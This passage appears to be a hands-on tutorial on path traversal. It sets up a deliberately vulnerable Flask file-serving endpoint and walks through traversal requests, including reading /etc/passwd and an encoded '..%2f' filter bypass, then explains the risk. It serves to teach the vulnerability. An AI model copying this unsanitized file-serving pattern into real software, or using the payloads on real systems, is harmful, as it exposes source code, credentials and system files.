 filepath = os.path.join("documents", filename)
 return send_file(filepath)
app.run(port=5000)
Make a folder documents and put files in it like report.txt---### 🟢 Step 2: Start the Apppython app.pyNow try:http://localhost:5000/api/read/report.txt → ✅ Shows file---### 🟢 Step 3: Simulate Path TraversalTry this malicious request:http://localhost:5000/api/read/../../app.py✅ It shows the source code of the app — this should NOT happen!Try Linux password file (won’t work on Windows):http://localhost:5000/api/read/../../../../etc/passwd✅ If visible, huge problem!Encoded version (bypass basic filters):http://localhost:5000/api/read/..%2f..%2f..%2fetc/passwd✅ Path traversal using encoded form---### 🟢 Step 4: Analyze the Risk- You used a filename path parameter- App concatenates untrusted input without sanitization- It gives access to files outside intended folder- In real attacks, this may allow source code leakage, keys, or sensitive logs---### 🟢 Step 5: Safe Test File Overwrite (Advanced)Try creating a harmless file like test.txt outside the documents/ folder, and try to access it via traversal:http://localhost:5000/api/read/../test.txt✅ If the app lets you read it, the traversal is confirmed---### 🛑 Warning: Never run this on real apps unless you’re authorized. Use local environments or bug bounty programs.

